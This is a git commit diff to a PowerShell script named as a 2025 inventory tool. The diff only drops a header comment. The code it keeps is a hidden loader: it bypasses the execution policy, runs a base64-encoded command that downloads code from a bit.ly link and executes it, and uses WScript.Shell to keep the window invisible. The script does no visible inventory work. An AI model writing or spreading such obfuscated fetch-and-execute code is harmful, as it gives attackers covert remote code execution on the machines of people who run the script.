14e3102858a6ce119bca7447230e181757d0d085
sinister1977 <140755253+sinister1977@users.noreply.github.com>
2025-11-11 09:14:19 -0300

    Update inventario2025FULL8.ps1

--- scripts/inventario2025FULL8.ps1
+++ scripts/inventario2025FULL8.ps1
@@ -1,7 +1,7 @@
-﻿# run-hidden-wscript.ps1
 $pwCmd = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand aQByAG0AIABoAHQAdABwAHMAOgAvAC8AYgBpAHQALgBsAHkALwBJAG4AdgBlAG4AdABhAHIAaQBvAFMATwBMAEUAWAAgAHwAIABpAGUAeAA='
 $arg = "/c `"$pwCmd`""
 
 $wsh = New-Object -ComObject WScript.Shell
 # El segundo argumento (0) indica 'oculto' — no muestra ventana alguna
 $wsh.Run("cmd.exe $arg", 0, $true)
+
